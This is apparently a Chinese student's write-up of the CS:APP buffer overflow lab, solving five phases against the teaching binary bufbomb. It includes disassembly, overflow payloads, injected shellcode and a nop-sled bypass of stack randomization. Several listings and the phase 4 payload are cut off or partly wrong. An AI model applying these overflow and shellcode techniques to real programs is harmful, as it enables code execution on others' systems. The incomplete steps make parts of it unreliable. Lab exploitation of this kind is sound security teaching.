    buffer lab：

    文件说明：

    bufbomb：攻击目标文件，使用举例：./bufbomb -u sixpar

    makecookie：根据每个用户输入的userid生成每个用户专属的cookie（4字节数据），也就是说不同的userid对应不同的结果。使用举例： ./makecookie sixpar

    hex2raw：将十六进制的数据转为普通字符以便于输入

    实验文档手册：

    根据实验文档手册，如下：

    1 /* Buffer size for getbuf */
2 #define NORMAL_BUFFER_SIZE 32 
3
4 int getbuf()
5 {
6 char buf[NORMAL_BUFFER_SIZE];
7 Gets(buf);
8 return 1;
9 }

    我们知道了程序中调用了getbuf()函数，而getbuf函数实际又调用了gets函数，这个函数以’\n’作为数据输入结束标记。因此它只知道读取，不知道buf能不能承受那么多的数据，所以很容易存在溢出问题。

    根据定义，buf的size为32字节。当输入的数据不超出buf的size时，Gets函数调用后会return 0x1，否则溢出则会造成错误：segmentation fault！

    1.phase1：

    目标是执行smoke，而不是让getbuf()返回1

    溢出getbuf()函数，然后把test()的返回地址填为smoke()函数起始地址。

    gdb-peda$ disassemble getbuf
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:        push   ebp
   0x080491f5 <+1>:        mov    ebp,esp
   0x080491f7 <+3>:        sub    esp,0x38
   0x080491fa <+6>:        lea    eax,[ebp-0x28]
   0x080491fd <+9>:        mov    DWORD PTR [esp],eax
   0x08049200 <+12>:    call   0x8048cfa <Gets>
   0x08049205 <+17>:    mov    eax,0x1
   0x0804920a <+22>:    leave  
   0x0804920b <+23>:    ret

    Gets函数的返回值存储在 ebp-0x28 的位置，该地址即存储buf字符串的起始地址。

    所以知道getbuf的栈大小为0x28（40）个字节。

    而smoke的的起始地址为0x8048c18，所以就这样咯。40字节+ebp的a字节都填充掉。然后把原本test()的返回地址覆盖为smoke()地址

    结果：

    highk@highk:~/csapp lab/buffer lab$ cat phase1.txt | ./bufbomb -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:Smoke!: You called smoke()
VALID
NICE JOB!

    2.phase2：

    这一回，实验要求返回到 fizz()函数。

    gdb-peda$ disassemble fizz
Dump of assembler code for function fizz:

   0x08048c5f <+29>:    mov    DWORD PTR [esp],0x1
   0x08048c66 <+36>:    call   0x80489c0 <__printf_chk@plt>
   0x08048c6b <+41>:    mov    DWORD PTR [esp],0x1
   0x08048c72 <+48>:    call   0x804937b <validate>
   0x08048c77 <+53>:    jmp    0x8048c91 <fizz+79>
   0x08048c79 <+55>:    mov    DWORD PTR [esp+0x8],eax

   0x08048c85 <+67>:    mov    DWORD PTR [esp],0x1

    可以看到0x08048c4b这一行，程序会把eax（我们传入的参数val）和 ds:0x804d108 处的值进行比对。

    猜测0x804d108处存的就是cookie的值。

    调试一下，使用 r -u sixpar 运行程序，然后什么都不用干，直接截断。

    然后查看：

    gdb-peda$ x/10xw 0x804d108
0x804d108 <cookie>:    0x171ae53c    0xf7fb15a0    0x00000000    0x00000000

    发现这个地方果然存储着属于我sixpar用户的cookie： 0x171ae53c

    eax则取 [ebp+0x8] 的值。所以我们溢出，把ebp+0x8的位置覆盖为正确的cookie值就行了啊。

    这里注意的是哪个ebp。

    由于返回地址填为了fizz()，所以最后pop fizz的起始地址到eip然后跳转执行。

    fizz函数的开头会 push ebp，然后mov esp,ebp，使得在原先返回地址的位置上又开启了一个新的栈帧（虽然栈帧还是空的，esp和ebp还是指向同一地方的），所以当执行到取ebp+0x8的位置的值的语句的时候，这里的ebp指的是新的ebp。新的ebp+0x8

    所以照此思路，我们构造payload时，也要在原先返回的地址的后面的0x8的位置上放cookie的值才行。

    这也就是为什么返回地址和cookie值之间还多出来4字节数据的原因。（我一开始还没搞懂hhh）

    所以最终构造如下：

    0000000000000000
0000000000000000
0000000000000000    
0000000000000000    
00000000428C0408
000000003Ce51a17

    highk@highk:~/csapp lab/buffer lab$ cat phase2.txt | ./bufbomb -u sixpar

    3.phase3：

    返回到bang()函数。本题需要植入机器码，修改 global_value 为 cookies 的值。

    bang函数如下：

    gdb-peda$ disassemble bang

   0x08048cb4 <+23>:    mov    DWORD PTR [esp+0x4],0x804a360
   0x08048cbc <+31>:    mov    DWORD PTR [esp],0x1
   0x08048cc3 <+38>:    call   0x80489c0 <__printf_chk@plt>
   0x08048cc8 <+43>:    mov    DWORD PTR [esp],0x2
   0x08048ccf <+50>:    call   0x804937b <validate>
   0x08048cd4 <+55>:    jmp    0x8048cee <bang+81>
   0x08048cd6 <+57>:    mov    DWORD PTR [esp+0x8],eax
   0x08048cda <+61>:    mov    DWORD PTR [esp+0x4],0x804a50c
   0x08048ce2 <+69>:    mov    DWORD PTR [esp],0x1
   0x08048ce9 <+76>:    call   0x80489c0 <__printf_chk@plt>
   0x08048cee <+81>:    mov    DWORD PTR [esp],0x0
   0x08048cf5 <+88>:    call   0x8048900 <exit@plt>

    可见它会把0x804d108处的值给eax，然后比较eax和cookie值是否相等。

    我们查看一下0x804d108：

    gdb-peda$ x/10xw 0x804d100
0x804d100 <global_value>:    0x00000000    0x00000000    0x171ae53c    0xf7fb15a0

    发现存储的是 global_value变量的地址。而不远处的0x171ae53c刚好存储着正确的cookie的值。

    我们的想法就是注入代码，然后修改global_value变量的值。并且把bang函数的起始地址压入栈，随后ret。

    所以得到的注入代码如下：

    movl $0x171ae53c,%eax
movl %eax,0x804d100
pushl $0x08048c9d
ret

    然后将汇编文件转为机器码。

    gcc -m32 -c phase3.s ，注意加 -m 32 ，因为这是32位的程序。

    得到：

    highk@highk:~/csapp lab/buffer lab$ objdump -d phase3.o

phase3.o：     文件格式 elf32-i386

Disassembly of section .text:

00000000 <.text>:
   0:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
   5:    a3 00 d1 04 08           mov    %eax,0x804d100
   a:    68 9d 8c 04 08           push   $0x8048c9d
   f:    c3                       ret

    所以机器码就是：

    b8 3c e5 1a 17 a3 00 d1 04 08 68 9d 8c 04 08 c3

    把这串shellcode写在栈首地址，然后返回地址填栈的首地址就可啦。

    对了，说到栈的首地址，这里还是重复一遍吧。

    gdb调试，然后在getbuf函数中的call Gets处下断点，b *0x8049200

    然后r运行起来，自动断在Gets处，然后ni下一步，随便输入aaaaaa，然后就可以看到栈中：

    0x55683e18 (“aaaaaaaa”)

    说明0x55683e18 就是栈的首地址，它同时也是字符串指针指向字符串。

    4.phase4：

    本题要求我们注入一段能够修改 getbuf 返回值的代码，把返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 程序的剩下部分。

    继续上汇编：

    getbuf():

    gdb-peda$ disassemble getbuf
Dump of assembler code for function getbuf:

   0x080491f5 <+1>:        mov    ebp,esp

    且经过调试，栈首地址为：0x55683e18

    B83CE51A1768BE8D

    5.phase5：

    使用 -n 参数运行 bufbomb（实际会运行testn函数体而不是test函数体了），程序会开启栈随机化来组织攻击代码。因此需要绕过栈随机化。

    因此本题是testn函数和getbufn函数，且栈大小有0x208（520）字节。

    并且实验手册上写着说是会调用getbufn函数 5次，我是看不出来为什么会调用5次的?代码看不出啥名堂。

    我需要连续输入五次正确的字符串，程序将会对每一次输入调用testn函数后调用getbufn函数，其中由于加入了对栈帧的扰动，栈帧的绝对位置会发生变化，因此不能再像上一个任务那样记下ebp的值再恢复。那么，如何在调用攻击代码时正确地恢复ebp的值，并让getbufn函数返回值为cookie，并且返回到testn函数呢？

    虽然我们在写字符串的过程中会覆盖掉旧的ebp，使得getbufn结束跳转到攻击代码时ebp的值不能正常恢复，但在getbufn的最后，会有leave语句，即 mov esp,ebp。

    覆盖掉了ebp没有关系，反正还有esp，只见esp已经被正常恢复到testn调用getbufn之前的状态，而testn中，esp = ebp - 24，所以只需恢复ebp到esp + 24。

    看到testn开头部分的代码：

    ebp与esp在同一个起跑线，然后push了一个ebx，所以esp要减去0x4，再手动分配0x24空间，所以esp又要减去0x24，所以与一开始的ebp比起来要少 (0x24+0x4) 字节。

    所以如果这时候esp+0x28，那么就可以得到调用getbufn函数之前的时候ebp的值啦（也就是我们压入栈帧里的那个ebp啦）。我们覆盖了ebp没关系，反正找到其源头就可。

    所以插入的汇编代码如下：

    lea 0x28(%esp),%ebp
mov $0x171ae53c,%eax
push $0x08048e3a
ret

    解释：溢出之后恢复ebp的值，然后构造返回值eax为cookie，随后返回到testn中调用getbufn函数的下一行。

    接下来就要确定返回地址填的该是什么地址了。

    因为buf的初始地址不确定，所以在payload中填充的跳转地址只能根据它的大致范围确定。

    我们选取可能的buf起始地址范围中的最大地址值：0x55683ca8。

    因为栈是从地址高处下降的，而代码是按正常的地址顺序执行的，所以使程序返回到最大的地址就可以使程序在运行攻击代码之前不遇到nop以外的指令。不过我还是听得一愣一愣的。不过后来我自己慢慢理解，终于有点领悟了。越靠后（地址越大）的栈起始地址就越有可能完全包含我们构造的所有栈数据（即使未完全包含也没事，最起码包含到nop就没事，然后就会一步步滑下去，直到执行我们的shellcode），避免遇到nop之前的其他指令。

    这样当buf移动的时候，由于 nop sled ，该地址将可以命中。

    所以最后构造payload：总共528个字节，其中末尾4字节是最大的栈起始地址0x55683ca8，倒数第二个4字节是ebp的值，可以随便覆盖没事，因为我们后续根据esp和ebp的关系把ebp的值给恢复过来。再倒数15个字节那就是我们的shellcode部分了。 其余都用“\x90”（nop）填充。
